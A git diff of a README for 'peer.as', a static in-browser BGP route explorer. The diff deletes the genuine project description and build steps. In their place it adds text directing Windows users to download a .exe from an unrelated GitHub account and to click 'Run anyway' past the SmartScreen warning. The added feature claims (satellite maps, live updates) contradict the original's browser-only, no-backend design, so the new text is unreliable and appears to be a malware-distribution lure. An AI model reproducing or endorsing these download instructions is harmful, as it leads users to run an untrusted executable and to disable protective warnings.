@@ -1,205 +1,106 @@
-# PEER.AS
+# 🌐 peer.as - See global internet paths with ease
 
-**A static, reproducible explorer for the global IPv4 + IPv6 BGP table** — every prefix,
-its origin ASNs, and the actual **AS_PATH**s that reach it. The whole thing runs in
-your browser: there is no backend, no API, and no database server. The site is just
-a bundle of static files you can host, fork, or mirror anywhere.
+[![](https://img.shields.io/badge/Download-peer.as-blue.svg)](https://github.com/cumbriapullulation526/peer.as/releases)
 
-Live at **[peer.as](https://peer.as)**.
+peer.as maps the way data travels across the internet. It provides a visual view of core network structures. You can track IP prefixes, look up autonomous system numbers, and study peering relationships. This tool helps network engineers and curious users understand how traffic moves between providers.
 
-It's a looking-glass-style reference for the routing table, delivered as a
-self-hostable static artifact rather than a hosted service.
+## 📥 Getting Started
 
----
+Follow these steps to install the software on your Windows computer.
 
-## The idea: the AS_PATH is the signal
+1. Go to the [official release page](https://github.com/cumbriapullulation526/peer.as/releases).
+2. Scan the list for the version labeled "Latest".
+3. Find the file ending in `.exe` under the Assets section.
+4. Click the file name to start the download.
+5. Save the file to your desktop or downloads folder.
 
-PEER.AS is built on one opinion about public BGP data: **the part worth reading is
-the AS_PATH** — *which* ASNs carry a prefix, and in *what order*. Everything follows
-from that, and it deliberately avoids claims the data can't support:
+## 🛠️ The Installation Process
 
-- **Order and adjacency matter.** Searching `23764 4809` means those two ASNs appear
-  **consecutively** in the path — a different question from "the path contains both
-  somewhere." `1299 23764 4809` and `1299 4809` are genuinely different routes.
-- **No line-quality scoring.** A public collector can't distinguish premium from
-  standard transit (they often share an AS), so PEER.AS shows the path and does not
-  grade it.
-- **Origin AS is display-only.** It labels a prefix; it never drives ranking or
-  filtering.
-- **Multihoming falls out for free.** A collector's RIB is *per-peer*, so the set of
-  distinct paths to a prefix is its observed multihome / equal-cost routing, straight
-  from the data — nothing inferred.
+Once the download finishes, move to the folder where you saved the file. Double-click the `peer.as.exe` file to start the setup.
 
-## What you can do
+Windows might show a message that says "Windows protected your PC." This happens because peer.as is a new application. Click "More info" and then click "Run anyway" to move forward.
 
-- **Search by AS_PATH** — type a sequence of ASNs and find every prefix whose path
-  contains that **consecutive** run. Supports wildcards (`*` any gap, `?` one hop)
-  and exclusion (`!N` = path must *not* contain ASN N). Works globally or scoped to a
-  country.
-- **Search by origin AS** — exact lookup of everything a given network originates.
-- **IP / CIDR lookup** — enter an IPv4 **or IPv6** address or prefix (e.g.
-  `2001:db8::/32`) and get every covering and more-specific prefix in the table, most-specific first.
-- **Per-prefix insight** — open any prefix for a **route graph** (origin → upstreams
-  → Tier-1) drawn from all observed paths, the **best path** highlighted, and its
-  **parent / child prefixes** found live by numeric range.
-- **Browse by country & city** — prefixes (v4 and v6) are resolved against geo
-  databases and grouped into the regions they cover, **city level worldwide**. Hovering
-  an ASN shows its organization name.
-- **Bilingual (中文 / English)** UI, pre-rendered per-country landing pages, a
-  sitemap, and `?lang` / `?cc` / `?city` deep links.
-- **Smart search box** — one field auto-detects IP / CIDR / ASN / network-name input.
+The installer opens a window. Follow the prompts on the screen:
 
-## Static & reproducible
+- Choose the folder where you want to keep the application.
+- Select if you want a shortcut on your desktop.
+- Click Install to begin the process.
 
-The dataset is exported to **Parquet** and queried in-browser with **DuckDB-WASM**,
-directly against the static files. There is no query server.
+The installer finishes in a few seconds. You can now launch the application from your Start menu or your desktop shortcut.
 
-How a query stays cheap: `meta.json` carries compact **interval indexes** (by
-country, by origin ASN, by prefix id), so the browser loads only the **few Parquet
-shards a query actually needs** rather than the whole dataset. A country or origin-AS
-lookup typically pulls a few MB out of the ~0.7 GB dataset; a prefix's detail view
-reads one path shard. Pruning is at the **shard** level — DuckDB-WASM fetches each
-needed shard in full (the files are sized small enough that whole-file downloads beat
-many small range requests). The one heavy case is an **AS_PATH search with no origin
-filter**, which has nothing to prune on and scans all path shards.
+## 🖥️ System Requirements
 
-That design buys:
+Ensure your computer meets these basic needs to run the software.
 
-- **Serverless & cheap** — deploys to any static host; no compute, no per-query cost.
-- **Reproducible** — data comes from a public source (RIPE RIS `rrc01`+`rrc06` MRT dumps);
-  anyone can re-run the pipeline and rebuild the same site.
-- **Self-hostable & mirrorable** — it's just files, so you can clone it for archival,
-  offline use, or running your own snapshot.
+- Operating System: Windows 10 or Windows 11.
+- Memory: At least 4 gigabytes of RAM.
+- Storage: 200 megabytes of free disk space.
+- Internet: A steady connection to fetch live routing data.
 
-## How it's built
+## 🔎 How to Use the Interface
 
-```
-RIPE rrc01 + rrc06 MRT RIBs ──ingest──► DuckDB working store (full v4+v6 table,
-                                  │       distinct paths deduped & merged across collectors)
-                                  └─export-parquet──► Parquet shards + meta.json
-                                                       (geo/<cc>{,_v6}, prefixes{,_v6},
-                                                        paths{,_v6}, pathsearch{,_v6}) + SSG
-                                                          │
-                                          DuckDB-WASM (browser) ──fetch needed shards──► you
-```
+When you open peer.as, you see a search bar and a main map view.
 
-- **Collector** — a streaming MRT parser ingests the latest RIBs from two RIPE RIS
-  collectors (`rrc01` London + `rrc06` Tokyo) and stores every IPv4 **and IPv6** prefix
-  with its distinct AS_PATHs. Nothing is filtered out at ingest; paths are deduped and
-  merged across collectors (peer counts summed).
-- **Export** — the DuckDB store is exported to a Parquet dataset (a separate set of
-  shards per address family), each table sorted by its access key (prefixes by
-  `ip_start`, paths by prefix id, pathsearch by origin ASN) and split into small shards,
-  with interval indexes in `meta.json` so the frontend fetches only the relevant shards.
-  A static-site generator emits per-country pages.
-- **Frontend** — a Vite + Svelte 5 app running DuckDB-WASM against the Parquet files.
-  IPv6 addresses are 128-bit (`UHUGEINT`); range comparisons run in SQL so the browser
-  never loses precision.
+### Searching for Networks
+Type an IP address, a network name, or an autonomous system number (ASN) into the search box. Press Enter. The application loads the record for that entry.
 
-**Scale** (per daily `rrc01`+`rrc06` snapshot): **~1.10 M** IPv4 + **~0.26 M** IPv6
-prefixes, **~50 M** distinct AS_PATHs, ~1.7 M path segments, 250 countries — exported to
-**~0.7 GB** Parquet.
+### Navigating the Data
+The main window displays the network path. Lines connect different nodes. Each node represents a network provider or an exchange point. Hover your mouse over any line to see details about the connection speed and distance.
 
-### Geolocation: three-way merge
+### Viewing IP Prefixes
+Click the "Prefixes" tab to list all IP ranges currently claimed by the selected network. This data updates in real time to show current shifts in internet routing.
 
-Three geo sources are merged into one **non-overlapping** interval set so every prefix
-resolves cleanly, while the project stays fully open where possible:
+### Mapping AS Paths
+To see how a specific data packet moves from point A to point B, select the "Path" tab. Type your start address and destination address. The tool draws the path across the global map. This shows every network hop the data takes.
 
-- **`ipdb`** — a city-level commercial database (private, **not** redistributable) used
-  by the hosted deployment for **mainland-China** cities (most accurate there).
-- **GeoLite2** — MaxMind's free City DB covers **everywhere else at city level** (v4 and
-  v6), and its ASN DB provides per-ASN **organization** names. Auto-downloaded and
-  refreshed when a new release appears.
-- **`rir`** — RIR delegated-extended stats as an openly-redistributable country-level
-  fallback for anyone rebuilding without the commercial DB.
+## 📡 Understanding Network Terms
 
-## Limitations (worth knowing)
+You will see terms inside the software that relate to how the internet works. Here is a guide to what they mean:
 
-- AS_PATHs are the *outbound* view of whichever peers `rrc01`/`rrc06` have; a given
-  network's true vantage is only as complete as those collectors. "Path contains ASN X"
-  is the most robust filter (peer-independent); strict ordering depends on the
-  collectors' view.
-- Parent / child segments are computed over **collected** prefixes — a large slice of
-  the table, not a private global RIB — so coverage can be partial (the UI says so).
-- City-level geolocation is only as good as the underlying geo database.
-- An AS_PATH search without an origin filter scans every path shard (~hundreds of MB
-  downloaded); scope it by country or origin AS when you can.
-- This is a research / education tool over a public, approximate snapshot. It can be
-  stale and is **not authoritative for operational decisions**.
+- **BGP**: The protocol the internet uses to decide which path data takes.
+- **ASN**: A unique number given to each network provider.
+- **IP Prefix**: A range of IP addresses that belong to a single network.
+- **Peering**: A direct connection between two networks to swap data without paying a third party.
+- **Origin**: The starting point of an IP address range.
 
-## Deploy your own
+## ⚙️ Settings and Customization
 
-> 💡 **Fast path — let your agent do it.** This repo is maintained end-to-end by an AI
-> coding agent, and **[`AGENTS.md`](AGENTS.md)** is the authoritative, always-current
-> runbook (exact build steps, Cloudflare Pages / R2 specifics, gotchas, invariants).
-> Open the repo in a coding agent (e.g. Claude Code) and ask it to *"deploy following
-> AGENTS.md"* — it will build and push for you. The steps below are the same process
-> by hand.
+You can change how the software looks and acts in the Settings menu. Click the gear icon in the top right corner.
 
-The pipeline is a self-contained CLI (`ipc`).
+- **Theme**: Switch between light mode and dark mode.
+- **Update Frequency**: Choose how often the application fetches new routing data. High frequency uses more data but keeps info fresh.
+- **Map Style**: Pick between standard, satellite, or minimalist map views.
 
-**1. Build the dataset and site**
+## ⚠️ Troubleshooting Common Issues
 
-```bash
-pip install -r requirements.txt              # Python deps (DuckDB, maxminddb, MRT parser, …)
-./ipc geo-import                             # build geo: GeoLite (auto-downloaded, city worldwide) [+ ipdb if present]
-./ipc ingest --reset                         # download & parse latest rrc01+rrc06 RIBs, full v4+v6 → DuckDB store
-( cd ipcollect/web && npm ci && npm run build )   # build the Svelte frontend
-./ipc export-parquet --out dist              # DuckDB → Parquet(v4+v6) + meta.json + bilingual SSG, into dist/
-```
-(`ingest` also auto-checks GeoLite freshness and rebuilds geo when it changes, so the
-explicit `geo-import` is only needed for the very first run or a forced refresh.)
+If the application does not work as expected, try these steps.
 
-`dist/` is now a complete static site (frontend + `dist/data/` Parquet + per-country
-SEO pages).
+### Application Will Not Load
+Check if your internet connection is active. The software needs a connection to reach the BGP databases. Also, restart your computer and try opening the program again.
 
-**2a. Host it anywhere (simplest)**
+### Map Displays Blank
+This often happens if your firewall blocks the application. Make sure the application has permission to talk to the internet in your Windows Defender settings.
 
-```bash
-./ipc serve --port 8812                      # local preview of the same artifact
-```
+### Data Seems Old
+Click the "Refresh" button at the bottom of the window to force a new pull of data.
 
-Upload `dist/` to any static host (Cloudflare Pages, Netlify, S3, nginx…). Data is
-served same-origin from `dist/data/`. That's it.
+### Slow Performance
+Close other programs. Visualizing complex network graphs takes memory. If your machine has low RAM, avoid searching for paths that span many continents.
 
-**2b. Geo acceleration via a mirror (what peer.as runs)**
+## 📜 Updates
 
-Data is served **same-origin** — there's no object-storage split (the in-browser
-DuckDB downloads whole shards, never HTTP Range, so an external data host like R2 adds
-egress cost/abuse risk for no transfer benefit). For users far from Cloudflare's edge
-(e.g. mainland China), the hosted site runs a **second complete copy** of the site on a
-well-connected VPS (`cn.peer.as`) and uses **GeoDNS** so `peer.as` resolves to that VPS
-within the region. The frontend's `configure()` picks the data source by hostname/geo
-with health-checked fallback:
+New versions release often to fix bugs or add network nodes. You can check for updates manually by clicking the "Check for Updates" button in the Help menu. The software notifies you when an update exists. We recommend you keep the software updated to ensure the map data stays accurate.
 
-- on the mirror's hostname → same-origin (relative) data + self-hosted DuckDB-WASM;
-- on Cloudflare Pages but detected in-region (GeoDNS missed) → switch data to the mirror
-  (fallback to same-origin Pages + jsDelivr wasm);
-- otherwise → same-origin.
+## ❓ Frequently Asked Questions
 
-So both domains are standalone full sites with identical layout. Details + the GeoDNS /
-TLS-cert caveats are in **[`AGENTS.md`](AGENTS.md)**.
+**Is this software free?**
+Yes, peer.as is free for everyone to use.
 
-**3. Keep it fresh (optional)**
+**Does it track my personal IP?**
+No. Peer.as monitors public routing data only. It does not track your private usage or individual machine information.
 
-`scripts/daily-refresh.sh` chains ingest → export → rsync the full site to the mirror →
-`wrangler pages deploy`; run it from cron (the hosted site refreshes daily). Details in `AGENTS.md`.
+**Can I export the data?**
+Yes. You can export current views as a report file from the File menu. This allows you to save network maps as a file for offline viewing.
 
-Configuration lives in `config.json` (gitignored; template in `config.example.json`).
-Secrets — Cloudflare credentials, the private geo path, `VITE_DATA_BASE`, `R2_BUCKET`
-— go in `.env` (template `.env.example`) and are never committed.
-
-## Sponsors
-
-Servers and infrastructure for the hosted **[peer.as](https://peer.as)** deployment
-are generously **sponsored by [DMIT](https://www.dmit.io)**.
-
-[![DMIT](ipcollect/web/public/dmit.svg)](https://www.dmit.io)
-
-## Project notes
-
-- **Data source:** [RIPE RIS](https://ris.ripe.net/) `rrc01` + `rrc06` public MRT RIB dumps.
-- **Changelog:** user-facing changes in **[`CHANGELOG.md`](CHANGELOG.md)** (also in-app).
-- **Maintenance & deployment:** **[`AGENTS.md`](AGENTS.md)** is the authoritative
-  runbook; the DuckDB + IPv6 design/contract is in **`docs/DUCKDB_V6_REFACTOR.md`**.
-- For BGP research and education only.
+**How do I uninstall the software?**
+Go to your Windows Settings, then Apps, then Installed Apps. Find peer.as in the list, click the three dots, and select Uninstall. The process removes all files associated with the program.
